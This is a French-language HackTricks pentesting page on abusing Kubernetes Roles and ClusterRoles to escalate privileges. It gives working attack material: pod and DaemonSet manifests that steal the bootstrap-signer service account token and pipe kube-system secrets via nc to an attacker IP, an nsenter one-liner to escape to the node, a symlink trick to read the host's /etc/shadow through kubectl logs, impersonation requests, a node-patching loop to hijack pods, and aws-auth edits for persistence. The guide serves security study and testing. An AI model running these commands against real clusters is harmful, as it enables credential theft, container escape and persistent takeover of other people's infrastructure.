# Abus des r√¥les/ClusterRoles dans Kubernetes

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
{% endhint %}

Ici, vous pouvez trouver des configurations de r√¥les et de ClusterRoles potentiellement dangereuses.\
Rappelez-vous que vous pouvez obtenir toutes les ressources prises en charge avec `kubectl api-resources`

## **√âl√©vation de privil√®ges**

D√©sign√©e comme l'art d'obtenir **l'acc√®s √† un autre principal** au sein du cluster **avec des privil√®ges diff√©rents** (au sein du cluster Kubernetes ou vers des clouds externes) que ceux que vous avez d√©j√†, dans Kubernetes il existe essentiellement **4 techniques principales pour escalader les privil√®ges** :

* Pouvoir **usurper l'identit√©** d'autres utilisateurs/groupes/SA avec de meilleurs privil√®ges au sein du cluster Kubernetes ou vers des clouds externes
* Pouvoir **cr√©er/patcher/ex√©cuter des pods** o√π vous pouvez **trouver ou attacher des SA** avec de meilleurs privil√®ges au sein du cluster Kubernetes ou vers des clouds externes
* Pouvoir **lire des secrets** car les jetons des SA sont stock√©s en tant que secrets
* Pouvoir **s'√©chapper vers le n≈ìud** √† partir d'un conteneur, o√π vous pouvez voler tous les secrets des conteneurs s'ex√©cutant dans le n≈ìud, les informations d'identification du n≈ìud et les autorisations du n≈ìud dans le cloud o√π il s'ex√©cute (le cas √©ch√©ant)
* Une cinqui√®me technique qui m√©rite d'√™tre mentionn√©e est la capacit√© √† **ex√©cuter un port-forward** dans un pod, car vous pourriez acc√©der √† des ressources int√©ressantes √† l'int√©rieur de ce pod.

### Acc√©der √† n'importe quelle ressource ou verbe (Joker)

Le **joker (\*) donne la permission sur n'importe quelle ressource avec n'importe quel verbe**. Il est utilis√© par les administrateurs. √Ä l'int√©rieur d'un ClusterRole, cela signifie qu'un attaquant pourrait abuser de n'importe quel espace de noms dans le cluster
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### Acc√©der √† n'importe quelle ressource avec un verbe sp√©cifique

En RBAC, certaines autorisations pr√©sentent des risques importants :

1. **`create` :** Accorde la capacit√© de cr√©er n'importe quelle ressource de cluster, risquant une √©l√©vation de privil√®ges.
2. **`list` :** Permet de lister toutes les ressources, potentiellement en train de divulguer des donn√©es sensibles.
3. **`get` :** Autorise l'acc√®s aux secrets des comptes de service, posant une menace pour la s√©curit√©.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Cr√©ation de Pod - Vol de jeton

Un attaquant avec les autorisations pour cr√©er un pod pourrait attacher un compte de service privil√©gi√© au pod et voler le jeton pour se faire passer pour le compte de service. Cela permet d'escalader efficacement les privil√®ges vers celui-ci.

Exemple d'un pod qui volera le jeton du compte de service `bootstrap-signer` et l'enverra √† l'attaquant :
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Cr√©ation et √âvasion de Pod

Ce qui suit indique tous les privil√®ges qu'un conteneur peut avoir :

* **Acc√®s privil√©gi√©** (d√©sactivation des protections et configuration des capacit√©s)
* **D√©sactiver les espaces de noms hostIPC et hostPid** qui peuvent aider √† escalader les privil√®ges
* **D√©sactiver l'espace de noms hostNetwork**, donnant acc√®s au vol des privil√®ges du cloud des n≈ìuds et un meilleur acc√®s aux r√©seaux
* **Monter les h√¥tes / √† l'int√©rieur du conteneur**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

Cr√©ez le pod avec :
```bash
kubectl --token $token create -f mount_root.yaml
```
Une ligne de [ce tweet](https://twitter.com/mauilion/status/1129468485480751104) avec quelques ajouts :
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
Maintenant que vous pouvez √©chapper au contr√¥le du n≈ìud, v√©rifiez les techniques de post-exploitation dans :

#### Furtivit√©

Vous voulez probablement √™tre **plus discret**, dans les pages suivantes, vous pouvez voir √† quoi vous auriez acc√®s si vous cr√©ez un pod en activant uniquement certains des privil√®ges mentionn√©s dans le mod√®le pr√©c√©dent :

* **Privil√©gi√© + hostPID**
* **Uniquement privil√©gi√©**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_Vous pouvez trouver des exemples de comment cr√©er/abuser des configurations de pods privil√©gi√©s pr√©c√©dents sur_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Cr√©er un Pod - Passer au cloud

Si vous pouvez **cr√©er** un **pod** (et √©ventuellement un **compte de service**), vous pourriez √™tre en mesure d'**obtenir des privil√®ges dans l'environnement cloud** en **assignant des r√¥les cloud √† un pod ou √† un compte de service** puis en y acc√©dant.\
De plus, si vous pouvez cr√©er un **pod avec l'espace de noms du r√©seau h√¥te**, vous pouvez **voler le r√¥le IAM** de l'**instance du n≈ìud**.

Pour plus d'informations, consultez :

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Cr√©er/Modifier le d√©ploiement, les ensembles de d√©mons, les ensembles d'√©tats, les contr√¥leurs de r√©plication, les ensembles de r√©plicas, les t√¢ches et les t√¢ches cron**

Il est possible d'abuser de ces autorisations pour **cr√©er un nouveau pod** et obtenir des privil√®ges comme dans l'exemple pr√©c√©dent.

Le yaml suivant **cr√©e un ensemble de d√©mons et exfiltre le jeton du compte de service** √† l'int√©rieur du pod :
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`** est une ressource dans Kubernetes utilis√©e pour **ex√©cuter des commandes dans un shell √† l'int√©rieur d'un pod**. Cela permet de **lancer des commandes √† l'int√©rieur des conteneurs ou d'obtenir un shell √† l'int√©rieur**.

Par cons√©quent, il est possible de **p√©n√©trer √† l'int√©rieur d'un pod et de voler le jeton du SA**, ou d'entrer dans un pod privil√©gi√©, de s'√©chapper vers le n≈ìud, et de voler tous les jetons des pods dans le n≈ìud et d'(ab)user du n≈ìud:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

Cette autorisation permet de **rediriger un port local vers un port sp√©cifi√© dans le pod**. Cela est destin√© √† faciliter le d√©bogage des applications s'ex√©cutant √† l'int√©rieur d'un pod, mais un attaquant pourrait l'exploiter pour acc√©der √† des applications int√©ressantes (comme des bases de donn√©es) ou vuln√©rables (sites web ?) √† l'int√©rieur d'un pod :
```
kubectl port-forward pod/mypod 5000:5000
```
### √âchappement /var/log/ inscriptible des h√¥tes

Comme **indiqu√© dans cette recherche**, si vous pouvez acc√©der ou cr√©er un pod avec le **r√©pertoire `/var/log/` des h√¥tes mont√©** dessus, vous pouvez **√©chapper du conteneur**.\
Cela est essentiellement d√ª au fait que lorsque le **Kube-API tente d'obtenir les journaux** d'un conteneur (en utilisant `kubectl logs <pod>`), il **demande le fichier `0.log`** du pod en utilisant le point de terminaison `/logs/` du service **Kubelet**.\
Le service Kubelet expose le point de terminaison `/logs/` qui expose essentiellement le syst√®me de fichiers `/var/log` du conteneur.

Par cons√©quent, un attaquant ayant **acc√®s en √©criture au r√©pertoire /var/log/** du conteneur pourrait abuser de ces comportements de 2 mani√®res :

* Modifier le fichier `0.log` de son conteneur (g√©n√©ralement situ√© dans `/var/logs/pods/namespace_pod_uid/container/0.log`) pour qu'il soit un **lien symbolique pointant vers `/etc/shadow`** par exemple. Ensuite, vous pourrez exfiltrer le fichier shadow des h√¥tes en faisant :
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* Si l'attaquant contr√¥le un principal avec les **permissions de lecture de `nodes/log`**, il peut simplement cr√©er un **lien symbolique** dans `/host-mounted/var/log/sym` vers `/` et lors de l'**acc√®s √† `https://<gateway>:10250/logs/sym/`, il listera le syst√®me de fichiers racine des h√¥tes** (modifier le lien symbolique peut donner acc√®s aux fichiers).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**Un laboratoire et un exploit automatis√© peuvent √™tre trouv√©s dans** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Contourner la protection en lecture seule <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Si vous avez de la chance et que la capacit√© hautement privil√©gi√©e `CAP_SYS_ADMIN` est disponible, vous pouvez simplement remonter le dossier en rw:
```bash
mount -o rw,remount /hostlogs/
```
#### Contournement de la protection en lecture seule de hostPath <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Comme indiqu√© dans [**cette recherche**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), il est possible de contourner la protection :
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
Ce qui √©tait cens√© emp√™cher les √©chappatoires comme les pr√©c√©dents en utilisant, au lieu d'un montage hostPath, un PersistentVolume et une PersistentVolumeClaim pour monter un dossier h√¥te dans le conteneur avec un acc√®s en √©criture :
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Usurpation de comptes privil√©gi√©s**

Avec un privil√®ge d'[**usurpation d'utilisateur**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation), un attaquant pourrait usurper un compte privil√©gi√©.

Il suffit d'utiliser le param√®tre `--as=<nom_utilisateur>` dans la commande `kubectl` pour usurper un utilisateur, ou `--as-group=<groupe>` pour usurper un groupe :
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
Ou utilisez l'API REST :
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Listing Secrets

La permission de **list secrets pourrait permettre √† un attaquant de r√©ellement lire les secrets** en acc√©dant au point de terminaison de l'API REST :
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Lecture d'un secret - force brute des identifiants de jetons

Alors qu'un attaquant en possession d'un jeton avec des autorisations de lecture n√©cessite le nom exact du secret pour l'utiliser, contrairement au privil√®ge plus large de _**listing secrets**_, il existe toujours des vuln√©rabilit√©s. Les comptes de service par d√©faut dans le syst√®me peuvent √™tre √©num√©r√©s, chacun √©tant associ√© √† un secret. Ces secrets ont une structure de nom : un pr√©fixe statique suivi d'un jeton alphanum√©rique al√©atoire de cinq caract√®res (√† l'exclusion de certains caract√®res) selon le [code source](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

Le jeton est g√©n√©r√© √† partir d'un ensemble limit√© de 27 caract√®res (`bcdfghjklmnpqrstvwxz2456789`), plut√¥t que de la plage alphanum√©rique compl√®te. Cette limitation r√©duit le nombre total de combinaisons possibles √† 14 348 907 (27^5). Par cons√©quent, un attaquant pourrait raisonnablement ex√©cuter une attaque par force brute pour d√©duire le jeton en quelques heures, ce qui pourrait potentiellement entra√Æner une √©l√©vation de privil√®ges en acc√©dant √† des comptes de service sensibles.

### Demandes de signature de certificat

Si vous avez les verbes **`create`** dans la ressource `certificatesigningrequests` (ou au moins dans `certificatesigningrequests/nodeClient`). Vous pouvez **cr√©er** un nouveau CeSR d'un **nouveau n≈ìud**.

Selon la [documentation, il est possible d'approuver automatiquement ces demandes](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), donc dans ce cas, vous **n'avez pas besoin de permissions suppl√©mentaires**. Sinon, vous devriez √™tre en mesure d'approuver la demande, ce qui signifie une mise √† jour dans `certificatesigningrequests/approval` et `approve` dans `signers` avec le nom de ressource `<signerNameDomain>/<signerNamePath>` ou `<signerNameDomain>/*`

Un **exemple de r√¥le** avec toutes les autorisations requises est :
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
Donc, avec le nouveau CSR du n≈ìud approuv√©, vous pouvez **abuser** des autorisations sp√©ciales des n≈ìuds pour **voler des secrets** et **escalader les privil√®ges**.

Dans [**cet article**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) et [**celui-ci**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/), la configuration du d√©marrage s√©curis√© TLS de GKE K8s est configur√©e avec une **signature automatique** et elle est exploit√©e pour g√©n√©rer les informations d'identification d'un nouveau n≈ìud K8s, puis exploiter celles-ci pour escalader les privil√®ges en volant des secrets.\
Si vous **avez les privil√®ges mentionn√©s, vous pourriez faire la m√™me chose**. Notez que le premier exemple contourne l'erreur emp√™chant un nouveau n≈ìud d'acc√©der aux secrets √† l'int√©rieur des conteneurs car un **n≈ìud ne peut acc√©der qu'aux secrets des conteneurs mont√©s sur celui-ci.**

La fa√ßon de contourner cela est simplement de **cr√©er des informations d'identification de n≈ìud pour le nom du n≈ìud o√π le conteneur avec les secrets int√©ressants est mont√©** (mais v√©rifiez simplement comment le faire dans le premier article):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

Les principaux qui peuvent modifier les **`configmaps`** dans l'espace de noms kube-system sur les clusters EKS (doivent √™tre dans AWS) peuvent obtenir des privil√®ges d'administrateur de cluster en √©crasant le **aws-auth** configmap.\
Les verbes n√©cessaires sont **`update`** et **`patch`**, ou **`create`** si le configmap n'a pas √©t√© cr√©√©:

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
Vous pouvez utiliser **`aws-auth`** pour **la persistance** en donnant acc√®s aux utilisateurs d'**autres comptes**.

Cependant, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **ne fonctionne pas √† partir d'un compte diff√©rent**. Mais en r√©alit√©, `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` fonctionne si vous mettez l'ARN du cluster au lieu du nom.\
Pour que `kubectl` fonctionne, assurez-vous simplement de **configurer** le **kubeconfig de la victime** et dans les arguments exec aws ajoutez `--profile other_account_role` afin que kubectl utilise le profil de l'autre compte pour obtenir le jeton et contacter AWS.
{% endhint %}

### Escalade dans GKE

Il existe **2 fa√ßons d'attribuer des autorisations K8s aux principaux GCP**. Dans tous les cas, le principal a √©galement besoin de l'autorisation **`container.clusters.get`** pour pouvoir rassembler les informations d'identification permettant d'acc√©der au cluster, ou vous devrez **g√©n√©rer votre propre fichier de configuration kubectl** (suivez le lien suivant).

{% hint style="warning" %}
Lors de la communication avec le point de terminaison de l'API K8s, le **jeton d'authentification GCP sera envoy√©**. Ensuite, GCP, via le point de terminaison de l'API K8s, v√©rifiera d'abord si le principal (par e-mail) **a un acc√®s √† l'int√©rieur du cluster**, puis il v√©rifiera s'il a **un acc√®s via GCP IAM**.\
Si **l'un** de ces √©l√©ments est **vrai**, il recevra une **r√©ponse**. Sinon, une **erreur** sugg√©rant de donner des **autorisations via GCP IAM** sera donn√©e.
{% endhint %}

Ensuite, la premi√®re m√©thode consiste √† utiliser **GCP IAM**, les autorisations K8s ont leurs **√©quivalents en autorisations GCP IAM**, et si le principal les a, il pourra les utiliser.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

La deuxi√®me m√©thode consiste √† **attribuer des autorisations K8s √† l'int√©rieur du cluster** en identifiant l'utilisateur par son **e-mail** (compris les comptes de service GCP).

### Cr√©er des jetons de comptes de service

Les principaux qui peuvent **cr√©er des demandes de jeton** (`serviceaccounts/token`) lors de la communication avec le point de terminaison de l'API K8s SAs (informations provenant de [**ici**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### ephemeralcontainers

Les principaux qui peuvent **`mettre √† jour`** ou **`patcher`** les **`pods/ephemeralcontainers`** peuvent obtenir **l'ex√©cution de code sur d'autres pods**, et potentiellement **s'√©chapper** vers leur n≈ìud en ajoutant un conteneur √©ph√©m√®re avec un securityContext privil√©gi√©.

### ValidatingWebhookConfigurations ou MutatingWebhookConfigurations

Les principaux avec l'un des verbes `create`, `update` ou `patch` sur `validatingwebhookconfigurations` ou `mutatingwebhookconfigurations` pourraient √™tre en mesure de **cr√©er l'une de ces configurations de webhook** afin de pouvoir **escalader les privil√®ges**.

Pour un exemple de [`mutatingwebhookconfigurations`, consultez cette section de ce post](./#malicious-admission-controller).

### Escalade

Comme vous pouvez le lire dans la section suivante : [**Pr√©vention de l'escalade des privil√®ges int√©gr√©e**](./#built-in-privileged-escalation-prevention), un principal ne peut ni mettre √† jour ni cr√©er des r√¥les ou des clusterroles sans avoir lui-m√™me ces nouvelles autorisations. Sauf s'il a le **verbe `escalate`** sur **`roles`** ou **`clusterroles`.**\
Alors il peut mettre √† jour/cr√©er de nouveaux r√¥les, clusterroles avec des autorisations sup√©rieures √† celles qu'il a.

### Proxy des n≈ìuds

Les principaux ayant acc√®s √† la sous-ressource **`nodes/proxy`** peuvent **ex√©cuter du code sur des pods** via l'API Kubelet (selon [**ceci**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)). Plus d'informations sur l'authentification Kubelet sur cette page :

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Vous avez un exemple de comment obtenir [**RCE en parlant autoris√© √† une API Kubelet ici**](../pentesting-kubernetes-services/#kubelet-rce).

### Supprimer des pods + n≈ìuds non planifiables

Les principaux qui peuvent **supprimer des pods** (verbe `delete` sur la ressource `pods`), ou **√©vacuer des pods** (verbe `create` sur la ressource `pods/eviction`), ou **modifier l'√©tat du pod** (acc√®s √† `pods/status`) et peuvent **rendre d'autres n≈ìuds non planifiables** (acc√®s √† `nodes/status`) ou **supprimer des n≈ìuds** (verbe `delete` sur la ressource `nodes`) et ont le contr√¥le sur un pod, pourraient **voler des pods d'autres n≈ìuds** pour qu'ils soient **ex√©cut√©s** dans le **n≈ìud compromis** et l'attaquant peut **voler les jetons** de ces pods.

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### √âtat des services (CVE-2020-8554)

Les principaux qui peuvent **modifier** **`services/status`** peuvent d√©finir le champ `status.loadBalancer.ingress.ip` pour exploiter la **CVE-2020-8554 non corrig√©e** et lancer des attaques **MiTM contre le cluster**. La plupart des mesures d'att√©nuation pour la CVE-2020-8554 ne pr√©viennent que les services ExternalIP (selon [**ceci**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)).

### √âtat des n≈ìuds et des pods

Les principaux avec des autorisations **`update`** ou **`patch`** sur `nodes/status` ou `pods/status`, pourraient modifier les libell√©s pour affecter les contraintes de planification appliqu√©es.

## Pr√©vention de l'escalade de privil√®ges int√©gr√©e

Kubernetes dispose d'un [m√©canisme int√©gr√©](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) pour pr√©venir l'escalade de privil√®ges.

Ce syst√®me garantit que **les utilisateurs ne peuvent pas √©lever leurs privil√®ges en modifiant les r√¥les ou les liaisons de r√¥les**. L'application de cette r√®gle se fait au niveau de l'API, offrant une protection m√™me lorsque l'autorisateur RBAC est inactif.

La r√®gle stipule qu'un **utilisateur ne peut cr√©er ou mettre √† jour un r√¥le que s'il poss√®de toutes les autorisations comprises dans le r√¥le**. De plus, la port√©e des autorisations existantes de l'utilisateur doit correspondre √† celle du r√¥le qu'il tente de cr√©er ou de modifier : soit √† l'√©chelle du cluster pour les ClusterRoles, soit confin√©e au m√™me espace de noms (ou √† l'√©chelle du cluster) pour les Roles.

{% hint style="warning" %}
Il y a une exception √† la r√®gle pr√©c√©dente. Si un principal a le **verbe `escalate`** sur **`roles`** ou **`clusterroles`**, il peut augmenter les privil√®ges des r√¥les et des clusterroles m√™me sans avoir les autorisations lui-m√™me.
{% endhint %}

### **Obtenir & Modifier les RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**Apparemment, cette technique fonctionnait auparavant, mais selon mes tests, elle ne fonctionne plus pour la m√™me raison expliqu√©e dans la section pr√©c√©dente. Vous ne pouvez pas cr√©er/modifier un rolebinding pour vous-m√™me ou un autre SA pour lui donner des privil√®ges si vous ne les avez pas d√©j√†.**
{% endhint %}

Le privil√®ge de cr√©er des Rolebindings permet √† un utilisateur de **lier des r√¥les √† un compte de service**. Ce privil√®ge peut potentiellement entra√Æner une √©l√©vation de privil√®ges car il **permet √† l'utilisateur de lier des privil√®ges d'administrateur √† un compte de service compromis.**

## Autres attaques

### Application proxy Sidecar

Par d√©faut, il n'y a pas de chiffrement dans la communication entre les pods. Authentification mutuelle, bidirectionnelle, pod √† pod.

#### Cr√©er une application proxy Sidecar <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Cr√©ez votre .yaml
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Modifiez votre fichier .yaml et ajoutez les lignes comment√©es :
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Voir les journaux du proxy :
```bash
kubectl logs app -C proxy
```
Plus d'informations sur : [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Contr√¥leur d'admission malveillant

Un contr√¥leur d'admission **intercepte les requ√™tes vers le serveur API Kubernetes** avant la persistance de l'objet, mais **apr√®s que la requ√™te a √©t√© authentifi√©e** **et autoris√©e**.

Si un attaquant parvient d'une mani√®re ou d'une autre √† **injecter un contr√¥leur d'admission de mutation**, il pourra **modifier des requ√™tes d√©j√† authentifi√©es**. En √©tant potentiellement capable de faire de l'escalade de privil√®ges, et plus g√©n√©ralement de persister dans le cluster.

**Exemple de** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
V√©rifiez le statut pour voir s'il est pr√™t :
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Ensuite, d√©ployez un nouveau pod :
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
Lorsque vous voyez l'erreur `ErrImagePull`, v√©rifiez le nom de l'image avec l'une des requ√™tes suivantes :
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
